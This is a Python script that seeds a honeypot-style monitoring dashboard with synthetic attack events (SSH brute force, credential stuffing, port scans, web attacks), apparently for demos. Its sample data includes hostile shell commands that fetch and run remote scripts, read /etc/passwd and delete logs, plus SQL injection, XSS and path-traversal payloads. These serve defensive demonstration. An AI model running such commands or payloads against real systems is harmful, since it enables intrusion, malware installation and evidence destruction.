#!/usr/bin/env python3
"""Populate the database with SYNTHETIC demo events.

Use this to preview the dashboard/report without running any network
activity. Every record is generated locally through the real collection
pipeline (normalize -> score -> store) so severity/patterns behave exactly
like live captures. Country labels are hard-coded DEMO values - no online
geolocation is used.

    python scripts/seed_demo_data.py --wipe --hours 72
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from core.collector import Collector          # noqa: E402
from core.config import ensure_dirs, load_config  # noqa: E402
from core.database import Database            # noqa: E402

random.seed(42)  # reproducible demos

PROFILES = [
    {"ip": "45.33.32.156", "country": "United States", "city": "Fremont",
     "asn": "AS20473 Choopa LLC", "behavior": "bruteforce", "weight": 14},
    {"ip": "112.85.42.87", "country": "China", "city": "Hangzhou",
     "asn": "AS4134 Chinanet", "behavior": "bruteforce_commands", "weight": 10},
    {"ip": "141.98.10.60", "country": "Lithuania", "city": "Vilnius",
     "asn": "AS209366 UAB Host Baltic", "behavior": "bruteforce", "weight": 9},
    {"ip": "103.75.190.201", "country": "Vietnam", "city": "Hanoi",
     "asn": "AS135905 VNPT-Net", "behavior": "stuffing", "weight": 8},
    {"ip": "91.240.118.172", "country": "Russia", "city": "Moscow",
     "asn": "AS200593 Prospero", "behavior": "stuffing", "weight": 7},
    {"ip": "80.82.77.33", "country": "Netherlands", "city": "Amsterdam",
     "asn": "AS208286 Quasi Networks", "behavior": "scan", "weight": 12},
    {"ip": "222.186.19.226", "country": "China", "city": "Jiangsu",
     "asn": "AS134548 DXTL", "behavior": "scan", "weight": 11},
    {"ip": "192.241.208.172", "country": "United States", "city": "San Francisco",
     "asn": "AS14061 DigitalOcean", "behavior": "scan_web", "weight": 8},
    {"ip": "185.220.101.34", "country": "Germany", "city": "Frankfurt",
     "asn": "AS205100 F3 Netze (Tor exit)", "behavior": "web_attack", "weight": 7},
    {"ip": "104.152.52.31", "country": "United States", "city": "Phoenix",
     "asn": "AS398101 GoDaddy", "behavior": "web_attack", "weight": 6},
]

LOCAL_PROFILES = [
    {"ip": "192.168.1.57", "country": "Private network", "city": None,
     "asn": None, "behavior": "internal_scan", "weight": 6},
    {"ip": "127.0.0.1", "country": "Loopback (local machine)", "city": None,
     "asn": None, "behavior": "selftest", "weight": 4},
]

SCAN_NOISE_IPS = [
    ("34.92.14.201", "United States"), ("51.15.43.205", "France"),
    ("60.167.112.33", "China"), ("94.102.61.71", "Seychelles"),
    ("119.29.104.12", "China"), ("165.22.254.19", "United States"),
    ("171.244.36.28", "Vietnam"), ("185.156.73.54", "Russia"),
    ("193.32.162.143", "Seychelles"), ("45.146.164.110", "Netherlands"),
]

USERNAMES = ["root", "admin", "ubuntu", "pi", "oracle", "postgres", "test",
             "user", "guest", "deploy", "ubnt", "support"]
PASSWORDS = ["123456", "password", "toor", "admin", "qwerty", "12345678",
             "raspberry", "P@ssw0rd", "Welcome123", "Summer2023!",
             "rootme", "abc123", "", "letmein", "changeme"]
COMMANDS = [
    "uname -a; cat /proc/cpuinfo", "whoami && id",
    "cat /etc/passwd | grep root", "wget http://185.220.101.34/x.sh -qO- | sh",
    "curl -s http://103.75.190.201/bot.txt > /tmp/bot; chmod +x /tmp/bot",
    "ls -la /var/log", "netstat -tlnp", "ps aux | grep sshd",
    "rm -rf /var/log/secure", "history -c",
]
SQLI = ["/product.php?id=1' OR '1'='1' UNION SELECT null,password FROM users--",
        "/search?q=1'; DROP TABLE users;--", "/item?id=(SELECT SLEEP(5))--"]
XSS = ['/search?q=<script>alert(document.cookie)</script>',
       "/comment?text=<img src=x onerror=alert(1)>"]
TRAVERSAL = ["/download?file=../../../../etc/passwd",
             "/static/%2e%2e/%2e%2e/etc/shadow"]
PROBES = ["/cmd.php", "/wso.php", "/phpmyadmin/", "/wp-login.php",
          "/.git/config", "/xmlrpc.php"]


def weighted_profile(pool):
    total = sum(p["weight"] for p in pool)
    pick = random.uniform(0, total)
    upto = 0
    for p in pool:
        upto += p["weight"]
        if pick <= upto:
            return p
    return pool[0]


def make_events(hours: int):
    """Yield raw event dicts spread over the last *hours* hours."""
    now = time.time()
    start = now - hours * 3600
    sensors = [1433, 3306, 3389, 5432, 5900, 6379, 8000, 8081, 8443, 9000,
               9200, 27017, 2375, 3000, 5000]
    service_port = {"ssh": 2222, "http": 8080, "ftp": 2121, "telnet": 2323}

    def stamp():
        return random.uniform(start, now)

    def base(profile, service, event_type, dst_port, **kw):
        ts_epoch = kw.pop("epoch")
        iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(ts_epoch))
        ev = {
            "ts": iso, "epoch": ts_epoch, "src_ip": profile["ip"],
            "src_port": random.randint(30000, 65000), "dst_port": dst_port,
            "service": service, "event_type": event_type,
            "geo_country": profile["country"], "geo_city": profile["city"],
            "geo_asn": profile["asn"],
        }
        ev.update(kw)
        return ev

    # ---- behavioural bursts per profile ---------------------------------
    for profile in PROFILES + LOCAL_PROFILES:
        behavior = profile["behavior"]
        n_bursts = max(1, profile["weight"] // 2)
        for _burst in range(n_bursts):
            t0 = stamp()
            if behavior.startswith("bruteforce"):
                # long dense bursts -> brute_force AND credential_stuffing
                count = random.randint(16, 28)
                pool = [USERNAMES[i % len(USERNAMES)]
                        for i in range(count)]
                random.shuffle(pool)
                for i, name in enumerate(pool):
                    yield base(profile, "ssh", "login_attempt",
                               service_port["ssh"],
                               epoch=t0 + i * random.uniform(15, 45),
                               username=name,
                               password=random.choice(PASSWORDS),
                               payload=f"SSH auth user={name!r}")
                if behavior == "bruteforce_commands" and random.random() < 0.8:
                    for _c in range(random.randint(2, 5)):
                        yield base(profile, "ssh", "command",
                                   service_port["ssh"], epoch=t0 + 900 + random.uniform(0, 600),
                                   payload=random.choice(COMMANDS))
            elif behavior == "stuffing":
                count = random.randint(9, 18)
                pwd = random.choice(["Summer2023!", "Company@2024", "Qwerty123"])
                names = random.sample(range(1, 400), count)
                for i, n in enumerate(names):
                    yield base(profile, "http", "login_attempt",
                               service_port["http"],
                               epoch=t0 + i * random.uniform(25, 70),
                               username=f"user{n}",
                               password=pwd,
                               user_agent="Mozilla/5.0 (compatible; bot)",
                               payload="HTTP login form POST")
            elif behavior == "scan":
                chosen = random.sample(sensors, random.randint(6, 12))
                for i, port in enumerate(chosen):
                    yield base(profile, "sensor", "port_probe", port,
                               epoch=t0 + i * random.uniform(1, 8),
                               payload=None)
            elif behavior in ("web_attack", "scan_web"):
                if behavior == "scan_web":
                    for i, port in enumerate(random.sample(sensors, 5)):
                        yield base(profile, "sensor", "port_probe", port,
                                   epoch=t0 + i * 3)
                t1 = t0 + random.uniform(0, 120)
                for path, ua in (
                        (random.choice(SQLI), "sqlmap/1.7.11#stable"),
                        (random.choice(XSS), "Mozilla/5.0"),
                        (random.choice(TRAVERSAL), "Mozilla/5.0")):
                    yield base(profile, "http", "http_request",
                               service_port["http"], epoch=t1 + random.uniform(1, 60),
                               user_agent=ua, payload=f"GET {path}")
                for _p in range(random.randint(1, 3)):
                    yield base(profile, "http", "http_request",
                               service_port["http"], epoch=t1 + random.uniform(60, 180),
                               user_agent="Nmap Scripting Engine",
                               payload=f"GET {random.choice(PROBES)}")

    # ---- background scan noise from many one-off IPs --------------------
    for ip, country in SCAN_NOISE_IPS:
        profile = {"ip": ip, "country": country, "city": None, "asn": None}
        for port in random.sample(sensors, random.randint(2, 6)):
            yield base(profile, "sensor", "port_probe", port, epoch=stamp())

    # ---- occasional successful decoy logins (demo shell capture) --------
    for _n in range(3):
        profile = weighted_profile(PROFILES)
        yield base(profile, "ssh", "login_success", service_port["ssh"],
                   epoch=stamp(),
                   username=random.choice(("root", "admin")),
                   password=random.choice(("toor", "admin")),
                   payload="SSH auth accepted by decoy (shell mode ON)")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--db", default=None, help="database path override")
    ap.add_argument("--wipe", action="store_true", help="reset database first")
    ap.add_argument("--hours", type=int, default=72,
                    help="spread events across the last N hours")
    args = ap.parse_args()

    cfg = load_config()
    ensure_dirs()
    db_path = args.db or cfg["db_path"]
    db = Database(db_path)
    if args.wipe:
        db.reset()
        print(f"[+] Database wiped: {db_path}")

    collector = Collector(db, raw_writer=None, geo_enabled=False)

    count = 0
    for raw in sorted(make_events(args.hours), key=lambda e: e["epoch"]):
        if collector.collect(raw):
            count += 1

    stats = db.stats()
    print(f"[+] Seeded {count} synthetic events into {db_path}")
    print(f"    unique IPs: {stats['unique_ips']}, "
          f"critical: {stats.get('by_severity', {}).get('CRITICAL', 0)}, "
          f"credentials: {stats['credentials_captured']}")
    print("    NOTE: demo data uses hard-coded country labels "
          "(no online lookups).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
